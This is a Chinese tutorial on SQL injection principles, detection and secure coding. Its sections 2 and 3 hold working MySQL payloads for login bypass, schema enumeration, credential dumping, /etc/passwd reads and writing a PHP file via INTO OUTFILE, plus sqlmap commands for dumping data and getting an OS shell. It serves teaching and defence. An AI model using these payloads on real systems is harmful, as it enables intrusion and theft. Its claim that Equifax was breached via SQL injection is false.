---
order: 770
title: SQL 注入基础与检测
module: 'mysql'
category: 数据库
difficulty: intermediate
description: 注入原理、检测方法与防御策略入门。
author: fanquanpp
updated: '2026-11-17'
related:
  - 'mysql/890-MySQLQuickLookup'
  - 'mysql/900-AppLayerDbAccessPatterns'
  - 'mysql/750-SQLInjectionAttackTypePractice'
  - 'mysql/760-SQLInjectionDefenseStrategy'
prerequisites:
  - 'mysql/890-MySQLQuickLookup'
---


## 阅读前提

本文与后续两篇（攻击类型演练、防御策略）只讨论注入的原理、检测思路与防御。任何注入实验都只在授权环境进行：本地虚拟机、DVWA、sqli-labs 等靶场，或获得书面授权的测试目标；对未授权系统尝试注入属于违法行为。

## 1. SQL 注入概述 (Overview)

### 1.1 什么是 SQL 注入

SQL 注入（SQL Injection）是一种代码注入攻击技术，攻击者通过在应用程序的输入字段中插入恶意 SQL 代码，从而操纵数据库执行非预期的操作。这是 Web 应用程序中最常见、最危险的安全漏洞之一，位列 OWASP Top 10 之首。
**核心原理**：

- 应用程序将用户输入直接拼接到 SQL 查询语句中
- 攻击者利用这种拼接机制注入恶意 SQL 代码
- 数据库执行了攻击者构造的恶意查询
  **历史背景**：
  SQL 注入攻击最早于 1998 年被首次公开报道，当时一名黑客在 Web 应用程序中发现了这一漏洞。此后，SQL 注入成为最常见的 Web 攻击手段之一，给全球无数企业和组织造成了巨大的经济损失和声誉损害。

### 1.2 SQL 注入的危害

SQL 注入可能导致以下严重后果：

| 危害类型         | 说明                                           | 严重程度 |
| :--------------- | :--------------------------------------------- | :------- |
| **数据泄露**     | 获取敏感数据，如用户密码、个人信息、商业机密等 | 高       |
| **数据篡改**     | 修改、删除或插入数据库中的数据                 | 高       |
| **数据破坏**     | 删除表、清空数据甚至破坏整个数据库             | 极高     |
| **权限提升**     | 获取数据库管理员权限，控制服务器               | 极高     |
| **远程代码执行** | 在某些情况下执行操作系统命令                   | 极高     |
| **网站接管**     | 完全控制 Web 应用程序                          | 高       |
| **身份冒充**     | 以合法用户身份进行操作                         | 高       |
| **服务拒绝**     | 使数据库服务崩溃或无法正常使用                 | 中       |
| **实际案例**：   |

- 2017 年 Equifax 数据泄露事件：攻击者通过 SQL 注入漏洞获取了 1.43 亿用户的敏感信息
- 2018 年 Ticketmaster 数据泄露：超过 40000 名用户的支付信息被窃取
- 众多中小企业网站因 SQL 注入导致用户数据库被清空

### 1.3 SQL 注入的分类

SQL 注入可以按照不同的方式分类：

#### 1.3.1 按数据获取方式分类

- **带内注入（In-band）**：攻击者使用同一通道发送攻击和获取结果，最常见也最容易实施
- **盲注（Blind）**：无法直接获取查询结果，通过应用程序的行为推断，布尔盲注和时间盲注
- **带外注入（Out-of-band）**：使用不同的通道发送攻击和获取结果，如 DNS 通道

#### 1.3.2 按注入位置分类

- **GET 参数注入**：通过 URL 参数注入，最常见的注入点
- **POST 参数注入**：通过表单数据注入
- **Cookie 注入**：通过 Cookie 注入
- **HTTP 头注入**：通过 HTTP 请求头（如 User-Agent、X-Forwarded-For）注入
- **文件上传注入**：通过文件上传功能注入

#### 1.3.3 按数据库类型分类

- **MySQL 注入**：最常见的数据库注入
- **SQL Server 注入**：通常可利用 xp_cmdshell 执行系统命令
- **Oracle 注入**：可能利用 utl_http 包进行带外攻击
- **PostgreSQL 注入**：可能利用 COPY 命令读写文件

## 2. SQL 注入原理详解 (Principle)

### 2.1 基本原理示例

让我们通过一个简单的登录功能来理解 SQL 注入的原理。

#### 2.1.1 危险代码示例

```python
 # 危险代码：直接拼接用户输入
 def login(username, password):
  # 直接将用户输入拼接到 SQL 语句中
  sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
  cursor.execute(sql)
  return cursor.fetchone()
```

**代码分析**：
这段代码的问题在于直接将用户输入拼接到 SQL 语句中，没有任何过滤或转义。当用户输入正常的用户名和密码时，查询正常工作。但如果攻击者输入特殊的字符或 SQL 语句，就可以破坏原有查询的逻辑。

**双层防线提醒**：这段代码即使改成参数化查询，也只是防住了注入；密码本身的正确处理是注册时哈希存储、登录时验证哈希。注入防御与密码哈希各自独立、缺一不可，完整写法见 [SQL 注入防御策略](/mysql/760-SQLInjectionDefenseStrategy) 的 `verify_login` 与 1.8.3 节。

#### 2.1.2 正常登录

```python
 # 正常登录
 login("admin", "123456")
 # 执行的 SQL：
 # SELECT * FROM users WHERE username = 'admin' AND password = '123456'
```

**执行流程**：

1. 用户输入用户名 "admin" 和密码 "123456"
2. 应用程序构建查询语句
3. 数据库执行查询，验证用户凭据
4. 返回查询结果

#### 2.1.3 SQL 注入攻击

```python
 # 攻击者使用特殊输入绕过登录
 login("admin' --", "anything")
 # 执行的 SQL：
 # SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
 # 注释符 -- 后面的内容被忽略，只验证了 username = 'admin'
```

**攻击原理**：

1. 用户名输入 `admin' --`
2. 应用程序构建的 SQL 变为：`SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'`
3. 单引号闭合了原来的字符串
4. `--` 将后面的内容全部注释掉
5. 实际执行的查询变为：`SELECT * FROM users WHERE username = 'admin'`
6. 如果存在 admin 用户，攻击者即可绕过登录验证

### 2.2 SQL 注入的关键点

SQL 注入成功的关键要素：

1. **用户输入可控**：攻击者能够控制输入参数
2. **输入未经过滤**：应用程序没有对输入进行验证或转义
3. **输入直接拼接**：输入被直接拼接到 SQL 语句中
4. **错误信息暴露**：应用程序暴露了详细的数据库错误信息

### 2.3 SQL 注入的完整攻击流程

#### 2.3.1 信息收集阶段

攻击者首先需要收集目标系统的信息：

```sql
-- 1. 探测注入点是否存在：两次响应不同说明可能存在注入
1 AND 1=1
1 AND 1=2

-- 2. 探测数据库类型与版本
1' UNION SELECT VERSION(),2,3 -- 
1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1) -- 

-- 3. 获取当前数据库名与用户
1' UNION SELECT DATABASE(),USER(),3 -- 
1' UNION SELECT 1,CURRENT_USER(),DATABASE() -- 
```

#### 2.3.2 数据库枚举阶段

```sql
-- 1. 枚举所有数据库
1' UNION SELECT 1,2,GROUP_CONCAT(schema_name) FROM information_schema.schemata -- 

-- 2. 枚举当前库的所有表
1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() -- 

-- 3. 枚举目标表的列
1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' -- 

-- 4. 读取敏感数据
1' UNION SELECT 1,username,password FROM users -- 
```

#### 2.3.3 权限提升阶段

```sql
-- 1. 查看当前用户权限
1' UNION SELECT 1,2,GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges WHERE GRANTEE=CONCAT("'",USER(),"'") -- 

-- 2. 尝试读取文件（需要 FILE 权限）
1' UNION SELECT 1,2,LOAD_FILE('/etc/passwd') -- 

-- 3. 尝试写入 WebShell（需要 FILE 权限且 secure_file_priv 允许）
1' UNION SELECT 1,0x3C3F70687020706870696E666F28293B3F3E,3 INTO OUTFILE '/var/www/html/info.php' -- 

-- 4. 具备条件时可尝试通过 UDF 插件执行系统命令
SELECT sys_eval('whoami'); -- 需要已安装的 UDF 扩展
```

## 3. SQL 注入检测方法 (Detection Methods)

### 3.1 手动检测

#### 3.1.1 基础测试 Payload

```sql
'
"
' OR '1'='1
" OR "1"="1
' OR 1=1 --
" OR 1=1 --
' OR 'a'='a
" OR "a"="a
' --
" --
' #
" #
/* */
' OR 1=1 --
' OR '1'='1
1' OR '1'='1
' AND 1=1 --
' AND 1=2 --
1' AND 1=1 --
1' AND 1=2 --
1 AND 1=1
1 AND 1=2
' LIKE '%
%
' IN ('a', 'b') --
' UNION SELECT NULL --
' UNION SELECT 1,2 --
' UNION SELECT NULL, NULL --
```

#### 3.1.2 检测步骤

1. **识别输入点**：找出所有用户可控的输入

- URL 参数
- 表单数据
- Cookie
- HTTP 头

2. **基础测试**：输入单引号、双引号，观察响应

- 是否报错
- 错误信息是否暴露数据库细节

3. **Boolean 测试**：使用 AND 1=1 和 AND 1=2

- 两次响应是否不同
- 不同说明可能存在注入

4. **UNION 测试**：尝试 UNION 查询

- 确定列数
- 确定显示位置

5. **时间测试**：使用 SLEEP() 或 BENCHMARK()

- 如果响应延迟，说明存在注入

6. **错误测试**：输入可能导致错误的语句

- 观察错误信息

### 3.2 自动化检测工具

#### 3.2.1 SQLMap

SQLMap 是最流行的自动化 SQL 注入工具。

```bash
 # 基本用法
 sqlmap -u "http://example.com/product.php?id=1"
 # 测试 POST 请求
 sqlmap -u "http://example.com/login.php" --data="username=test&password=test"
 # 测试 Cookie
 sqlmap -u "http://example.com/page.php" --cookie="PHPSESSID=abc123"
 # 获取数据库
 sqlmap -u "http://example.com/product.php?id=1" --dbs
 # 获取表
 sqlmap -u "http://example.com/product.php?id=1" -D database_name --tables
 # 获取列
 sqlmap -u "http://example.com/product.php?id=1" -D database_name -T table_name --columns
 # 获取数据
 sqlmap -u "http://example.com/product.php?id=1" -D database_name -T table_name -C column1,column2 --dump
 # 获取 Shell
 sqlmap -u "http://example.com/product.php?id=1" --os-shell
 # 执行自定义 SQL
 sqlmap -u "http://example.com/product.php?id=1" --sql-query="SELECT * FROM users"
 # 批量测试
 sqlmap -m urls.txt
 # 使用 Tor 匿名网络
 sqlmap -u "http://example.com/product.php?id=1" --tor --tor-type=SOCKS5
```

#### 3.2.2 Burp Suite

```bash
 # 使用 Burp Suite 的 Intruder 模块
 # 1. 拦截请求
 # 2. 发送到 Intruder
 # 3. 设置 Payload
 # 4. 加载 SQL 注入 Payload 列表
 # 5. 分析响应
```

#### 3.2.3 其他工具

- **OWASP ZAP**：开源的 Web 应用安全扫描器
- **Havij**：图形化的 SQL 注入工具（仅支持 MySQL）
- **Sqlninja**：专门针对 SQL Server 的注入工具
- **NoSQLMap**：针对 NoSQL 数据库的注入工具

### 3.3 代码审计检测

#### 3.3.1 危险代码模式

```python
 # 危险模式 1：直接字符串拼接（f-string）
 sql = f"SELECT * FROM users WHERE id = {user_id}"
 # 危险模式 2：字符串拼接（+）
 sql = "SELECT * FROM users WHERE id = " + user_id
 # 危险模式 3：使用 % 格式化
 sql = "SELECT * FROM users WHERE id = %s" % user_id
 # 危险模式 4：使用 format()
 sql = "SELECT * FROM users WHERE id = {}".format(user_id)
 # 危险模式 5：没有参数化的存储过程调用
 cursor.callproc("get_user", (user_id,)) -- 取决于存储过程实现
```

#### 3.3.2 安全代码模式

```python
 # 安全模式 1：参数化查询
 sql = "SELECT * FROM users WHERE id = %s"
 cursor.execute(sql, (user_id,))
 # 安全模式 2：ORM 查询
 user = session.query(User).filter(User.id == user_id).first()
 # 安全模式 3：使用 SQLAlchemy
 result = conn.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})
```

#### 3.3.3 PHP 代码审计

```php
 // 危险代码
 $sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
 $result = mysqli_query($conn, $sql);
 // 安全代码
 $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
 $stmt->bind_param("s", $_POST['username']);
 $stmt->execute();
```

## 教学自检（先遮住代码自己写，再对照）

遮码自检法：先只读题干，自己写/自己答，再展开参考答案对照。

1. 概念自问：SQL 注入成立的根本条件是什么？为什么"过滤单引号"不是根治手段？

参考答案（先自己答，再对照）：根本条件是"用户输入被拼接进 SQL 文本后被当**代码**执行"——数据与代码的边界消失了。过滤单引号是黑名单思维：编码绕过（URL 编码、宽字节）、数字型注入不需要引号、二次注入（先存后用）都能绕过。根治只有一条路：参数化查询——预编译阶段 SQL 结构已定型，输入永远是**数据**，结构与数据在协议层分离。

2. 概念自问：数字型注入与字符型注入的利用差异是什么？为什么数字型更容易被忽视？

参考答案（先自己答，再对照）：字符型要闭合引号（' OR 1=1 --），输入处有显眼的字符串边界；数字型 `WHERE id = $id` 没有引号包裹，攻击者直接续写 SQL（1 OR 1=1），开发者也常因"参数看起来是数字"跳过校验——两个原因叠加让数字型成为审计遗漏的重灾区。防法统一：数字用强类型校验（isdigit/类型转换），全部参数化。

3. 判断题：接口只返回布尔值（登录成功/失败），注入者拿不到数据，风险可以忽略。

参考答案（先自己答，再对照）：不能忽略。布尔盲注正是为这种场景设计的——攻击者构造 `AND (SELECT ...) 条件为真/假` 的问题，靠成功/失败的差异**逐字符猜出**任意数据（二分法），每请求一字节，几万次请求拖完整个库。无回显还有时间盲注（SLEEP 延迟侧信道）。风险取决于"存在注入点"，不取决于"回显多少"。

4. 概念自问：代码审计定位注入点的三个高频特征是什么？

参考答案（先自己答，再对照）：其一，SQL 字符串拼接——`"SELECT ... " + input`、`$sql .= $_GET[...]`、模板字符串内嵌变量；其二，动态表名/列名/排序字段——参数化无法覆盖结构部位，需要白名单校验（枚举合法值）；其三，ORM 的"逃生通道"——原生 SQL 执行入口（raw query）、动态 filter 字段。审计口诀：找"输入流入 SQL 的路径"，看每一段拼接的来源是否受信。
